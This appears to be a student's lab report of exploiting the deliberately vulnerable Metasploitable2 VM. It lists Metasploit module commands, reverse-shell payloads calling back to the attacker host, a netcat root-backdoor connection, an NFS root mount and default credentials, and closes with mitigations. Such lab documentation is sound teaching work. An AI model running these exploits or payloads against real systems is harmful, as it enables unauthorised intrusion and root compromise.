# Metasploitable2 Exploitation Report

**Name:** Fawaz Rufai Mohammed
**Index Number:** 7357623
**Date:** September 21, 2026
**Target IP:** 192.168.1.3
**Attacker IP:** 192.168.1.4
**Attacker OS / Tools:** Kali Linux, `msfconsole` (Metasploit Framework), `nc`, `vncviewer`, `showmount`/NFS client

This report is written directly from the terminal capture screenshots supplied. Each numbered section below corresponds to the matching `evidence/exploitN.png` file.

---

## 1. vsftpd 2.3.4 Backdoor — Root Access

**Screenshot:** `evidence/exploit1.png`

- `search vsftpd` in `msfconsole` returns `exploit/unix/ftp/vsftpd_234_backdoor` (rank: excellent).
- `use exploit/unix/ftp/vsftpd_234_backdoor`, then `set RHOSTS 192.168.1.3` and `set LHOST 192.168.1.4`.
- On `run`, the module's automatic check flags the FTP banner as vulnerable ("FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)... backdoor may be present") and opens a Meterpreter session at `2026-09-28 17:53:56 -0400` (192.168.1.4:4444 → 192.168.1.3:50030).
- `meterpreter > getuid` returns **`root`**.

**Outcome:** Full root-level Meterpreter access with no credentials — the earliest timestamped exploit in the session.

---

## 2. Anonymous FTP Login — Banner Confirmation

**Screenshot:** `evidence/exploit2.png`

- A manual FTP session is opened with `ftp 192.168.1.3`. The service responds with the banner `220 (vsFTPd 2.3.4)`.
- Logging in as `Name: anonymous` is accepted with `230 Login successful`, confirming anonymous access is enabled.
- `ls -la` returns a directory listing (`.` and `..` entries), confirming a working, unauthenticated FTP session.

**Outcome:** Confirms both the vulnerable vsftpd banner and that anonymous FTP access is open — the recon step that set up Exploit 1.

---

## 3. UnrealIRCd 3.2.8.1 Backdoor — Vulnerable, No Session

**Screenshot:** `evidence/exploit3.png`

- `search unreal` lists `exploit/unix/irc/unreal_ircd_3281_backdoor` (rank: excellent).
- `use` the module, `set RHOSTS 192.168.1.3`, `set LHOST 192.168.1.4`.
- First `run`: Metasploit connects to port 6667, registers a fake IRC user `clark`, and reports `[+] 192.168.1.3:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands`, sends the backdoor command — but returns `[*] Exploit completed, but no session was created.`
- The payload is changed to `cmd/unix/reverse`, `ExitOnSession` is set to `false` (Metasploit warns this is an unknown datastore option for the module), and the module is run again with a second fake user, `nora`. Same result: vulnerability confirmed, no session.

**Outcome:** The IRC service is confirmed running the backdoored 3.2.8.1 build, but two attempts in this capture did not yield a working shell.

---

## 4. Samba `usermap_script` — Root Shell

**Screenshot:** `evidence/exploit4.png`

- `use exploit/multi/samba/usermap_script` (Metasploit defaults the payload to `cmd/unix/reverse_netcat`).
- `set RHOSTS 192.168.1.3`, `set LHOST 192.168.1.4`, then explicitly `set PAYLOAD cmd/unix/reverse_netcat`.
- `run` opens **command shell session 2** at `2026-09-28 18:25:37 -0400` (192.168.1.4:4444 → 192.168.1.3:58302).
- In the resulting shell: `whoami` → `root`; `id` → `uid=0(root) gid=0(root)`.

**Outcome:** Immediate root shell via the Samba username-map command-injection flaw.

---

## 5. Manual Netcat Connection to Port 1524 — Pre-existing Root Backdoor

**Screenshot:** `evidence/exploit5.png`

- `nc 192.168.1.3 1524` connects directly with no exploit module and no authentication prompt.
- The remote prompt returned is `root@metasploitable:/#`. Running `whoami` twice both return `root`; `id` returns `uid=0(root) gid=0(root) groups=0(root)`.
- Attempts to run `background`, `back`, and `bye` all return `bash: <command>: command not found` (these are `msfconsole`/Meterpreter commands, not valid in a plain bash shell), so the session is closed with `exit`.

**Outcome:** Port 1524 is Metasploitable2's well-known pre-existing "ingreslock" backdoor — a listening root shell that requires no exploitation at all, just a direct connection.

---

## 6. Apache Tomcat Manager WAR Upload — Deployed, No Session

**Screenshot:** `evidence/exploit6.png`

- `search tomcat_mgr_upload` returns `exploit/multi/http/tomcat_mgr_upload`.
- `use` the module; set `RHOSTS 192.168.1.3`, `RPORT 8180`, `HttpUsername tomcat`, `HttpPassword tomcat`, `LHOST 192.168.1.4`.
- `run`: the module retrieves a session ID/CSRF token, uploads and deploys a WAR file named `Ol2UvMzRkWqozwfktX4`, executes it, then automatically undeploys it (`Undeployed at /manager/html/undeploy`) — ending with `[*] Exploit completed, but no session was created.`

**Outcome:** The default `tomcat:tomcat` manager credentials worked and the WAR deployed/executed successfully, but no reverse shell session was captured in this run.

---

## 7. PostgreSQL Payload Execution — Meterpreter as `postgres`

**Screenshot:** `evidence/exploit7.png`

- `search postgres_payload` returns `exploit/linux/postgres/postgres_payload`.
- `use` the module (defaults to `linux/x86/meterpreter/reverse_tcp`); `set RHOSTS 192.168.1.3`, `set USERNAME postgres`, `set PASSWORD postgres`, `set LHOST 192.168.1.4`.
- `run`: connects to PostgreSQL 8.3.1 on port 5432, uploads a shared object to `/tmp/CApNekeB.so`, sends a 1,079,144-byte stage, and opens **Meterpreter session 3** at `2026-09-28 18:39:00 -0400` (192.168.1.4:4444 → 192.168.1.3:60503).
- `getuid` → `postgres`. `sysinfo` reports: Computer `metasploitable.localdomain`, OS `Ubuntu 8.04 (Linux 2.6.24-16-server)`, Architecture `i686`, BuildTuple `i486-linux-musl`, Meterpreter `x86/linux`.

**Outcome:** Code execution as the `postgres` service account via default database credentials.

---

## 8. DistCC Daemon Command Execution — Shell as `daemon`

**Screenshot:** `evidence/exploit8.png`

- `search distcc` returns `exploit/unix/misc/distcc_exec`.
- `use` the module; `set RHOSTS 192.168.1.3`, `set LHOST 192.168.1.4`.
- First `run` with the default payload `cmd/unix/reverse_bash` fails — stderr shows `bash: 215: Bad file descriptor` and `/dev/tcp/192.168.1.4/4444: No such file or directory`; no session created.
- Payload switched: `set PAYLOAD cmd/unix/reverse_perl`. Second `run` opens **command shell session 4** at `2026-09-28 18:42:39 -0400` (192.168.1.4:4444 → 192.168.1.3:60504).
- `whoami` → `daemon`; `id` → `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.

**Outcome:** Confirms distcc will execute arbitrary commands; the bash payload failed on this target but the Perl reverse shell succeeded, landing as the low-privileged `daemon` account.

---

## 9. NFS Export Enumeration and Mount

**Screenshot:** `evidence/exploit9.png`

- `showmount -e 192.168.1.3` returns the export list: `/ *` — the entire root filesystem is exported to any host.
- `sudo mkdir -p /mnt/nfs`, then `sudo mount -t nfs 192.168.1.3:/ /mnt/nfs` mounts it locally (a symlink for `rpc-statd.service` is created as part of the NFS client startup).
- `ls -la /mnt/nfs` lists the full root filesystem of the target — `bin`, `boot`, `etc`, `home`, `root`, `var`, etc. — all directly browsable from the attacker box, including a `-rw-------` file `EMKOOWyg` under the root of the share.
- The share is then unmounted with `sudo umount /mnt/nfs`.

**Outcome:** No exploit module was needed — misconfigured NFS exports alone gave direct, unauthenticated read access to the entire target filesystem.

---

## 10. VNC Weak Authentication — Login, Access, and Live Session

**Screenshots:** `evidence/exploit10.png`, `evidence/exploit10_evidence.png`

`evidence/exploit10.png`:
- `search vnc_login` returns `auxiliary/scanner/vnc/vnc_login`.
- `use` the module, `set RHOSTS 192.168.1.3`, `run`. Output: `192.168.1.3:5900 - Login Successful: :password` (a note also flags that no database is active, so credentials aren't being saved).
- First `vncviewer 192.168.1.3` attempt without supplying the password fails: `Authentication failure`.
- Second attempt, entering the recovered password `password`, succeeds: `Authentication successful`, `Desktop name "root's X desktop (metasploitable:0)"`, followed by the standard VNC pixel-format handshake details.

`evidence/exploit10_evidence.png`:
- A VirtualBox screenshot of the resulting live session: a TightVNC window titled "root's X desktop (metasploitable:0)" showing an open root terminal (`root@metasploitable:/#`) on the target's desktop — visual confirmation of the access, not just console output.

**Outcome:** A weak/default VNC password (`password`) grants full interactive access to a root graphical desktop session.

---

## Summary of Evidence

| Screenshot | Shows |
| --- | --- |
| `exploit1.png` | vsftpd 2.3.4 backdoor exploit → Meterpreter session, `getuid` = root |
| `exploit2.png` | Anonymous FTP login, confirms vulnerable vsftpd 2.3.4 banner |
| `exploit3.png` | UnrealIRCd 3.2.8.1 backdoor — vulnerable, no session (2 attempts) |
| `exploit4.png` | Samba `usermap_script` → root command shell |
| `exploit5.png` | Netcat to port 1524 → pre-existing root backdoor shell |
| `exploit6.png` | Tomcat manager WAR upload/deploy — no session |
| `exploit7.png` | PostgreSQL payload → Meterpreter session as `postgres` |
| `exploit8.png` | DistCC exec → shell as `daemon` (after switching payload) |
| `exploit9.png` | NFS export mounted and root filesystem enumerated |
| `exploit10.png` | VNC login scanner finds password; `vncviewer` authenticates |
| `exploit10_evidence.png` | Live VNC root desktop, visually confirmed in VirtualBox |

---

## Lessons Learned / Mitigations

1. **Default and weak credentials were the root cause in most successful exploits** — PostgreSQL (`postgres:postgres`), Tomcat (`tomcat:tomcat`), and VNC (`password`) were all accessible on first try. Enforcing strong, unique credentials removes this class of attack entirely.
2. **Legacy/backdoored software versions** — vsftpd 2.3.4 and UnrealIRCd 3.2.8.1 both shipped with attacker-inserted backdoors, and Samba 3.0.20's `usermap_script` option is a known RCE. Patching to current versions eliminates these specific flaws.
3. **Exposed administrative and file-sharing services** — VNC, NFS, and DistCC all accepted connections from the attacker with no network restriction, giving direct desktop, filesystem, or code-execution access. These services should sit behind a firewall or VPN, not be reachable directly.
4. **A "vulnerable" detection is not the same as a working exploit** — the UnrealIRCd and Tomcat attempts both confirmed the underlying weakness but did not return a shell in this session, which is worth documenting distinctly from techniques that did (vsftpd, Samba, PostgreSQL, DistCC, VNC, NFS).
